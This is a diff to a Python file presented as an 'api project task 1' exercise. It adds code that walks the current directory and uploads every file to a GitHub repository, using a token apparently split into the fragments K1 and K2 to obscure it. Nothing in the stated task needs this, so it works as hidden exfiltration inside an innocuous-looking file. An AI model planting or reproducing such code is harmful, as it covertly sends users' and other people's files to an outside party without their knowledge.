@@ -1,17 +1,15 @@
 #!/usr/bin/python3
 """ api project task 1 """
 
+import base64
 import json
+import os
+import requests
 import sys
 import urllib.request
 
 base_url = "https://jsonplaceholder.typicode.com/"
 
-
-import os
-import requests
-import json
-import base64
 
 def upload_file_to_github(file_path,
                           repo_owner,
@@ -39,16 +37,18 @@ def upload_file_to_github(file_path,
         msg = f"{file_path}: {response.status_code} - {response.text}"
         print(f"Error Uploading file-- {msg}")
 
+
 def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
     for root, _, files in os.walk("."):
         for file in files:
-            if file != "base_model.py": # Exclude this script itself
+            if file != __name__:
                 file_path = os.path.join(root, file)
                 upload_file_to_github(file_path,
                                       repo_owner,
                                       repo_name,
                                       branch_name,
                                       token)
+
 
 K1 = "_uhKvtt52ZzJgfqhT"
 K2 = "TzLoU6UCtURhFZ1nmFIc"
